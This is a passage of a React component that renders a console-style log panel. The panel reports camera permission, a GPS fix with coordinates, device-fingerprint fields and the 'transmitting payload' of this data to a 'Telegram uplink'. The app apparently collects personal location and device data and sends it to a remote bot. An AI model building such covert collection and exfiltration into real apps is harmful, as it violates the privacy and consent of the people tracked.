                    <div className="text-blue-400">
                      <span className="text-white/30">[06:47:42]</span> [SYS] Initialization complete. Bootstrapping telemetry...
                    </div>
                    <div className="text-green-400">
                      <span className="text-white/30">[06:47:45]</span> [AUTH] Camera permission verified: {cameraPermission.toUpperCase()}
                    </div>
                    <div className="text-yellow-400">
                      <span className="text-white/30">[{new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'})}]</span> [GEOLOC] GPS Lock acquired: {location ? `${location.lat.toFixed(4)}, ${location.lng.toFixed(4)}` : "PENDING"}
                    </div>
                    {isSyncing && (
                      <div className="text-white/60 animate-pulse">
                        <span className="text-white/30">[{new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'})}]</span> [SYNC] Transmitting payload to Telegram uplink...
                      </div>
                    )}
                    {lastSyncTime && (
                      <div className="text-green-500">
                        <span className="text-white/30">[{lastSyncTime}]</span> [SUCCESS] Handshake successful. Packet {syncCount} received by remote.
                      </div>
                    )}
                    {syncError && (
                      <div className="text-rose-500">
                        <span className="text-white/30">[{new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'})}]</span> [ERROR] Uplink failed: {syncError}
                      </div>
                    )}
                    <div className="text-white/20 pt-4 border-t border-white/5 leading-relaxed">
                      {`{ 
  "device": "${deviceName}", 
  "net": "${networkType}", 
  "res": "${screenRes}", 
  "br": "${browser}", 
  "bat": ${battery},
  "bri": ${brightness}
}`}
                    </div>
                  </div>
                  <div className="mt-4 pt-4 border-t border-white/10 flex items-center justify-between">
                    <div className="flex items-center gap-2">
                       <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse" />
                       <p className="text-white/50 uppercase tracking-tighter font-bold">Listening for remote signals...</p>
                    </div>
                    <p className="text-white/20 font-bold">ACK: 200 OK</p>
                  </div>
                </div>
              </div>
            </div>

            {/* Footer Metrics */}
            <div className="mt-8 grid grid-cols-2 md:grid-cols-4 gap-4">
              {[
                { label: 'Latency', value: '45ms', color: 'text-green-400' },
                { label: 'Threads', value: '128', color: 'text-blue-400' },
                { label: 'RAM Usage', value: '2.4GB', color: 'text-purple-400' },
                { label: 'Version', value: 'v1.2.4-stable', color: 'text-rose-400' },
              ].map((m, i) => (
                <div key={i} className="bg-white/5 border border-white/5 p-4 rounded-2xl">
                  <p className="text-[9px] font-black text-white/30 uppercase mb-1">{m.label}</p>
                  <p className={cn("text-sm font-black", m.color)}>{m.value}</p>
                </div>
              ))}
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>

  );
}
